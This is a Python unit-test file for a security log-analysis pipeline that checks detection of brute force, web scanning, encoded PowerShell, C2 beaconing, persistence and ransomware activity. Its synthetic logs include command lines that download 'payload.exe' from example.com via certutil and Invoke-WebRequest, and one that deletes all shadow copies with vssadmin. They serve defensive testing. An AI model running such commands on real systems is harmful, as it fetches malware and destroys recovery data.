import unittest

from engine.pipeline import analyze_security_events


class TestThreatLensPipeline(unittest.TestCase):

    def test_ssh_bruteforce_detected(self):
        logs = """
Aug 24 18:30:01 server sshd[4211]: Failed password for admin from 203.0.113.50 port 44121 ssh2
Aug 24 18:30:05 server sshd[4212]: Failed password for admin from 203.0.113.50 port 44122 ssh2
Aug 24 18:30:09 server sshd[4213]: Failed password for admin from 203.0.113.50 port 44123 ssh2
Aug 24 18:30:13 server sshd[4214]: Failed password for admin from 203.0.113.50 port 44124 ssh2
Aug 24 18:30:17 server sshd[4215]: Failed password for admin from 203.0.113.50 port 44125 ssh2
"""

        result = analyze_security_events(logs)

        self.assertIn(
            "TL-AUTH-001",
            result["summary"]["triggered_rules"],
        )

    def test_normal_ssh_does_not_trigger_bruteforce(self):
        logs = """
Aug 24 18:30:01 server sshd[4211]: Accepted password for admin from 203.0.113.50 port 44121 ssh2
"""

        result = analyze_security_events(logs)

        self.assertNotIn(
            "TL-AUTH-001",
            result["summary"]["triggered_rules"],
        )

    def test_compromised_login_detected(self):
        logs = """
Aug 24 18:30:01 server sshd[4211]: Failed password for admin from 203.0.113.50 port 44121 ssh2
Aug 24 18:30:05 server sshd[4212]: Failed password for admin from 203.0.113.50 port 44122 ssh2
Aug 24 18:30:09 server sshd[4213]: Failed password for admin from 203.0.113.50 port 44123 ssh2
Aug 24 18:30:15 server sshd[4214]: Accepted password for admin from 203.0.113.50 port 44124 ssh2
"""

        result = analyze_security_events(logs)

        self.assertIn(
            "TL-AUTH-002",
            result["summary"]["triggered_rules"],
        )

    def test_single_sensitive_web_path_does_not_trigger(self):
        logs = """
185.199.110.153 - - [31/May/2026:12:15:01 -0700] "GET /admin HTTP/1.1" 200 512
"""

        result = analyze_security_events(logs)

        self.assertNotIn(
            "TL-WEB-001",
            result["summary"]["triggered_rules"],
        )

    def test_web_scan_detected(self):
        logs = """
185.199.110.153 - - [31/May/2026:12:15:01 -0700] "GET /admin HTTP/1.1" 404 512
185.199.110.153 - - [31/May/2026:12:15:03 -0700] "GET /.env HTTP/1.1" 404 512
185.199.110.153 - - [31/May/2026:12:15:05 -0700] "GET /wp-admin HTTP/1.1" 404 512
"""

        result = analyze_security_events(logs)

        self.assertIn(
            "TL-WEB-001",
            result["summary"]["triggered_rules"],
        )

    def test_encoded_powershell_detected(self):
        logs = """
Process: powershell.exe CommandLine: powershell.exe -EncodedCommand TEST
"""

        result = analyze_security_events(logs)

        self.assertIn(
            "TL-EXEC-001",
            result["summary"]["triggered_rules"],
        )

    def test_normal_powershell_not_detected(self):
        logs = """
Process: powershell.exe CommandLine: powershell.exe Get-Service
"""

        result = analyze_security_events(logs)

        self.assertNotIn(
            "TL-EXEC-001",
            result["summary"]["triggered_rules"],
        )

    def test_suspicious_download_detected(self):
        logs = """
Process: certutil.exe CommandLine: certutil.exe -urlcache -split -f http://example.com/payload.exe payload.exe
"""

        result = analyze_security_events(logs)

        self.assertIn(
            "TL-EXEC-002",
            result["summary"]["triggered_rules"],
        )

    def test_legitimate_certutil_not_detected(self):
        logs = """
Process: certutil.exe CommandLine: certutil.exe -hashfile sample.exe SHA256
"""

        result = analyze_security_events(logs)

        self.assertNotIn(
            "TL-EXEC-002",
            result["summary"]["triggered_rules"],
        )

    def test_execution_chain_correlated(self):
        logs = """
Timestamp: 2026-08-25 18:10:01 Host: WIN-DEV-04 User: admin Process: powershell.exe CommandLine: powershell.exe -EncodedCommand TEST
Timestamp: 2026-08-25 18:10:12 Host: WIN-DEV-04 User: admin Process: powershell.exe CommandLine: powershell.exe Invoke-WebRequest http://example.com/payload.exe
"""

        result = analyze_security_events(logs)

        self.assertEqual(
            result["summary"]["incidents_count"],
            1,
        )

    def test_different_hosts_not_correlated(self):
        logs = """
Timestamp: 2026-08-25 18:10:01 Host: WIN-DEV-04 User: admin Process: powershell.exe CommandLine: powershell.exe -EncodedCommand TEST
Timestamp: 2026-08-25 18:10:12 Host: WIN-DEV-99 User: admin Process: powershell.exe CommandLine: powershell.exe Invoke-WebRequest http://example.com/payload.exe
"""

        result = analyze_security_events(logs)

        self.assertEqual(
            result["summary"]["incidents_count"],
            0,
        )

    def test_distant_events_not_correlated(self):
        logs = """
Timestamp: 2026-08-25 18:10:01 Host: WIN-DEV-04 User: admin Process: powershell.exe CommandLine: powershell.exe -EncodedCommand TEST
Timestamp: 2026-08-25 18:20:01 Host: WIN-DEV-04 User: admin Process: powershell.exe CommandLine: powershell.exe Invoke-WebRequest http://example.com/payload.exe
"""

        result = analyze_security_events(logs)

        self.assertEqual(
            result["summary"]["incidents_count"],
            0,
        )

    def test_c2_beaconing_detected(self):
        logs = """
EventID: 3
UtcTime: 2026-08-25 18:46:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
SourceIp: 10.0.0.25
SourcePort: 49721
DestinationIp: 198.51.100.42
DestinationPort: 443
Protocol: tcp

EventID: 3
UtcTime: 2026-08-25 18:47:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
SourceIp: 10.0.0.25
SourcePort: 49722
DestinationIp: 198.51.100.42
DestinationPort: 443
Protocol: tcp

EventID: 3
UtcTime: 2026-08-25 18:48:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
SourceIp: 10.0.0.25
SourcePort: 49723
DestinationIp: 198.51.100.42
DestinationPort: 443
Protocol: tcp

EventID: 3
UtcTime: 2026-08-25 18:49:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
SourceIp: 10.0.0.25
SourcePort: 49724
DestinationIp: 198.51.100.42
DestinationPort: 443
Protocol: tcp

EventID: 3
UtcTime: 2026-08-25 18:50:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
SourceIp: 10.0.0.25
SourcePort: 49725
DestinationIp: 198.51.100.42
DestinationPort: 443
Protocol: tcp
"""

        result = analyze_security_events(logs)

        self.assertIn(
            "TL-C2-001",
            result["summary"]["triggered_rules"],
        )

    def test_irregular_network_traffic_not_c2(self):
        logs = """
EventID: 3
UtcTime: 2026-08-25 18:46:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
SourceIp: 10.0.0.25
SourcePort: 49721
DestinationIp: 198.51.100.42
DestinationPort: 443
Protocol: tcp

EventID: 3
UtcTime: 2026-08-25 18:46:18.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
SourceIp: 10.0.0.25
SourcePort: 49722
DestinationIp: 198.51.100.42
DestinationPort: 443
Protocol: tcp

EventID: 3
UtcTime: 2026-08-25 18:48:47.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
SourceIp: 10.0.0.25
SourcePort: 49723
DestinationIp: 198.51.100.42
DestinationPort: 443
Protocol: tcp

EventID: 3
UtcTime: 2026-08-25 18:49:03.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
SourceIp: 10.0.0.25
SourcePort: 49724
DestinationIp: 198.51.100.42
DestinationPort: 443
Protocol: tcp

EventID: 3
UtcTime: 2026-08-25 18:53:52.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
SourceIp: 10.0.0.25
SourcePort: 49725
DestinationIp: 198.51.100.42
DestinationPort: 443
Protocol: tcp
"""

        result = analyze_security_events(logs)

        self.assertNotIn(
            "TL-C2-001",
            result["summary"]["triggered_rules"],
        )

    def test_rotating_destinations_not_c2(self):
        logs = """
EventID: 3
UtcTime: 2026-08-25 18:46:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
SourceIp: 10.0.0.25
SourcePort: 49721
DestinationIp: 198.51.100.41
DestinationPort: 443
Protocol: tcp

EventID: 3
UtcTime: 2026-08-25 18:47:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
SourceIp: 10.0.0.25
SourcePort: 49722
DestinationIp: 198.51.100.42
DestinationPort: 443
Protocol: tcp

EventID: 3
UtcTime: 2026-08-25 18:48:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
SourceIp: 10.0.0.25
SourcePort: 49723
DestinationIp: 198.51.100.43
DestinationPort: 443
Protocol: tcp

EventID: 3
UtcTime: 2026-08-25 18:49:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
SourceIp: 10.0.0.25
SourcePort: 49724
DestinationIp: 198.51.100.44
DestinationPort: 443
Protocol: tcp

EventID: 3
UtcTime: 2026-08-25 18:50:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
SourceIp: 10.0.0.25
SourcePort: 49725
DestinationIp: 198.51.100.45
DestinationPort: 443
Protocol: tcp
"""

        result = analyze_security_events(logs)

        self.assertNotIn(
            "TL-C2-001",
            result["summary"]["triggered_rules"],
        )


        def test_single_file_creation_not_flagged(self):
            logs = """
EventID: 11
UtcTime: 2026-08-25 19:10:01.200
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Users\\admin\\AppData\\Local\\Temp\\payload.exe
TargetFilename: C:\\Users\\admin\\Documents\\report.docx.locked
"""

        result = analyze_security_events(logs)

        self.assertNotIn(
            "TL-FILE-001",
            result["summary"]["triggered_rules"],
        )

    def test_rapid_file_activity_detected(self):
        logs = "\n\n".join(
            f"""EventID: 11
UtcTime: 2026-08-25 19:10:{i + 1:02d}.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Users\\admin\\AppData\\Local\\Temp\\payload.exe
TargetFilename: C:\\Users\\admin\\Documents\\file{i}.docx.locked"""
            for i in range(20)
        )

        result = analyze_security_events(logs)

        self.assertIn(
            "TL-FILE-001",
            result["summary"]["triggered_rules"],
        )

    def test_single_file_creation_not_flagged(self):
        logs = """
EventID: 11
UtcTime: 2026-08-25 19:10:01.200
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Users\\admin\\AppData\\Local\\Temp\\payload.exe
TargetFilename: C:\\Users\\admin\\Documents\\report.docx.locked
"""

        result = analyze_security_events(logs)

        self.assertNotIn(
            "TL-FILE-001",
            result["summary"]["triggered_rules"],

        )

    def test_registry_persistence_detected(self):
        logs = """
EventID: 13
UtcTime: 2026-08-25 20:15:01.500
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
TargetObject: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater
Details: C:\\Users\\admin\\AppData\\Roaming\\updater.exe
"""

        result = analyze_security_events(logs)

        self.assertIn(
            "TL-PERSIST-001",
            result["summary"]["triggered_rules"],
        )

    def test_benign_registry_change_not_flagged(self):
        logs = """
EventID: 13
UtcTime: 2026-08-25 20:20:01.500
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\reg.exe
TargetObject: HKCU\\Software\\ContosoApp\\Settings\\Theme
Details: Dark
"""

        result = analyze_security_events(logs)

        self.assertNotIn(
            "TL-PERSIST-001",
            result["summary"]["triggered_rules"],
        )
    def test_execution_then_persistence_correlation(self):
        logs = """
EventID: 1
UtcTime: 2026-08-25 20:10:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
CommandLine: powershell.exe -EncodedCommand TEST
ParentImage: C:\\Windows\\System32\\cmd.exe

EventID: 13
UtcTime: 2026-08-25 20:11:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
TargetObject: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater
Details: C:\\Users\\admin\\AppData\\Roaming\\updater.exe
"""

        result = analyze_security_events(logs)

        assert result["summary"]["incidents_count"] >= 1

        incident_ids = [
            incident["incident_id"]
            for incident in result["incidents"]
        ]

        assert "TL-CORR-002" in incident_ids

    def test_execution_persistence_different_hosts_no_correlation(self):
        logs = """
EventID: 1
UtcTime: 2026-08-25 20:10:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
CommandLine: powershell.exe -EncodedCommand TEST
ParentImage: C:\\Windows\\System32\\cmd.exe

EventID: 13
UtcTime: 2026-08-25 20:11:01.000
Computer: WIN-DEV-99
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
TargetObject: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater
Details: C:\\Users\\admin\\AppData\\Roaming\\updater.exe
"""

        result = analyze_security_events(logs)

        incident_ids = [
            incident["incident_id"]
            for incident in result["incidents"]
        ]

        assert "TL-CORR-002" not in incident_ids 

    def test_execution_persistence_outside_window_no_correlation(self):
        logs = """
EventID: 1
UtcTime: 2026-08-25 20:10:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
CommandLine: powershell.exe -EncodedCommand TEST
ParentImage: C:\\Windows\\System32\\cmd.exe

EventID: 13
UtcTime: 2026-08-25 20:20:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
TargetObject: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater
Details: C:\\Users\\admin\\AppData\\Roaming\\updater.exe
"""

        result = analyze_security_events(logs)

        incident_ids = [
            incident["incident_id"]
            for incident in result["incidents"]
    ]

        assert "TL-CORR-002" not in incident_ids 

    def test_recovery_inhibition_detected(self):
        logs = """
EventID: 1
UtcTime: 2026-08-25 21:00:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\vssadmin.exe
CommandLine: vssadmin.exe delete shadows /all /quiet
ParentImage: C:\\Windows\\System32\\cmd.exe
"""

        result = analyze_security_events(logs)

        rule_ids = [
            finding["rule_id"]
            for finding in result["findings"]
        ]

        self.assertIn("TL-IMPACT-001", rule_ids)


    def test_benign_vssadmin_not_flagged(self):
        logs = """
EventID: 1
UtcTime: 2026-08-25 21:05:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\vssadmin.exe
CommandLine: vssadmin.exe list shadows
ParentImage: C:\\Windows\\System32\\cmd.exe
"""

        result = analyze_security_events(logs)

        rule_ids = [
            finding["rule_id"]
            for finding in result["findings"]
        ]

        self.assertNotIn("TL-IMPACT-001", rule_ids)

    def test_ransomware_activity_correlated(self):
        file_events = []

        for i in range(20):
            file_events.append(
                f"""
EventID: 11
UtcTime: 2026-08-25 22:01:{i:02d}.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Users\\admin\\AppData\\Roaming\\payload.exe
TargetFilename: C:\\Users\\admin\\Documents\\file{i:02d}.docx.locked
"""
            )

        logs = """
EventID: 1
UtcTime: 2026-08-25 22:00:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
CommandLine: powershell.exe -EncodedCommand TEST
ParentImage: C:\\Windows\\System32\\cmd.exe

EventID: 1
UtcTime: 2026-08-25 22:00:30.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\vssadmin.exe
CommandLine: vssadmin.exe delete shadows /all /quiet
ParentImage: C:\\Windows\\System32\\cmd.exe
""" + "\n".join(file_events)

        result = analyze_security_events(logs)

        incident_ids = [
            incident["incident_id"]
            for incident in result["incidents"]
        ]

        self.assertIn("TL-RANSOM-001", incident_ids)


    def test_file_burst_without_impact_not_ransomware(self):
        file_events = []

        for i in range(20):
            file_events.append(
                f"""
EventID: 11
UtcTime: 2026-08-25 22:01:{i:02d}.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Users\\admin\\AppData\\Roaming\\payload.exe
TargetFilename: C:\\Users\\admin\\Documents\\file{i:02d}.docx.locked
"""
            )

        logs = """
EventID: 1
UtcTime: 2026-08-25 22:00:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
CommandLine: powershell.exe -EncodedCommand TEST
ParentImage: C:\\Windows\\System32\\cmd.exe
""" + "\n".join(file_events)

        result = analyze_security_events(logs)

        incident_ids = [
            incident["incident_id"]
            for incident in result["incidents"]
        ]

        self.assertNotIn("TL-RANSOM-001", incident_ids)

    def test_ransomware_signals_different_hosts_not_correlated(self):
        file_events = []

        for i in range(20):
            file_events.append(
                f"""
EventID: 11
UtcTime: 2026-08-25 22:01:{i:02d}.000
Computer: WIN-DEV-99
User: LAB\\admin
Image: C:\\Users\\admin\\AppData\\Roaming\\payload.exe
TargetFilename: C:\\Users\\admin\\Documents\\file{i:02d}.docx.locked
"""
            )

        logs = """
EventID: 1
UtcTime: 2026-08-25 22:00:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
CommandLine: powershell.exe -EncodedCommand TEST
ParentImage: C:\\Windows\\System32\\cmd.exe

EventID: 1
UtcTime: 2026-08-25 22:00:30.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\vssadmin.exe
CommandLine: vssadmin.exe delete shadows /all /quiet
ParentImage: C:\\Windows\\System32\\cmd.exe
""" + "\n".join(file_events)

        result = analyze_security_events(logs)

        incident_ids = [
            incident["incident_id"]
            for incident in result["incidents"]
        ]

        self.assertNotIn("TL-RANSOM-001", incident_ids)

    def test_sysmon_dns_event_parsed(self):
        logs = """
EventID: 22
UtcTime: 2026-08-25 23:00:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
QueryName: update-service.example.com
QueryResults: 203.0.113.50
"""

        result = analyze_security_events(logs)

        self.assertEqual(
            result["summary"]["events_parsed"],
            1,
        )

        self.assertEqual(
            result["events"][0].event_type,
            "dns_query",
        )

        self.assertEqual(
            result["events"][0].path,
            "update-service.example.com",
        )

    def test_dns_c2_correlation_detected(self):
        logs = """
EventID: 22
UtcTime: 2026-08-25 22:59:30.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
QueryName: update-service.example.com
QueryResults: 198.51.100.42

EventID: 3
UtcTime: 2026-08-25 23:00:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
SourceIp: 10.0.0.25
SourcePort: 49721
DestinationIp: 198.51.100.42
DestinationPort: 443
Protocol: tcp

EventID: 3
UtcTime: 2026-08-25 23:01:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
SourceIp: 10.0.0.25
SourcePort: 49722
DestinationIp: 198.51.100.42
DestinationPort: 443
Protocol: tcp

EventID: 3
UtcTime: 2026-08-25 23:02:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
SourceIp: 10.0.0.25
SourcePort: 49723
DestinationIp: 198.51.100.42
DestinationPort: 443
Protocol: tcp

EventID: 3
UtcTime: 2026-08-25 23:03:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
SourceIp: 10.0.0.25
SourcePort: 49724
DestinationIp: 198.51.100.42
DestinationPort: 443
Protocol: tcp

EventID: 3
UtcTime: 2026-08-25 23:04:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
SourceIp: 10.0.0.25
SourcePort: 49725
DestinationIp: 198.51.100.42
DestinationPort: 443
Protocol: tcp
"""

        result = analyze_security_events(logs)

        incident_ids = [
            incident["incident_id"]
            for incident in result["incidents"]
        ]

        self.assertIn(
            "TL-CORR-003",
            incident_ids,
        )

    def test_dns_wrong_ip_not_correlated_with_c2(self):
        logs = """
EventID: 22
UtcTime: 2026-08-25 22:59:30.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
QueryName: update-service.example.com
QueryResults: 203.0.113.99

EventID: 3
UtcTime: 2026-08-25 23:00:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
SourceIp: 10.0.0.25
SourcePort: 49721
DestinationIp: 198.51.100.42
DestinationPort: 443
Protocol: tcp

EventID: 3
UtcTime: 2026-08-25 23:01:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
SourceIp: 10.0.0.25
SourcePort: 49722
DestinationIp: 198.51.100.42
DestinationPort: 443
Protocol: tcp

EventID: 3
UtcTime: 2026-08-25 23:02:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
SourceIp: 10.0.0.25
SourcePort: 49723
DestinationIp: 198.51.100.42
DestinationPort: 443
Protocol: tcp

EventID: 3
UtcTime: 2026-08-25 23:03:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
SourceIp: 10.0.0.25
SourcePort: 49724
DestinationIp: 198.51.100.42
DestinationPort: 443
Protocol: tcp

EventID: 3
UtcTime: 2026-08-25 23:04:01.000
Computer: WIN-DEV-04
User: LAB\\admin
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
SourceIp: 10.0.0.25
SourcePort: 49725
DestinationIp: 198.51.100.42
DestinationPort: 443
Protocol: tcp
"""

        result = analyze_security_events(logs)

        incident_ids = [
            incident["incident_id"]
            for incident in result["incidents"]
        ]

        self.assertNotIn(
            "TL-CORR-003",
            incident_ids,
        )


    
if __name__ == "__main__":
    unittest.main()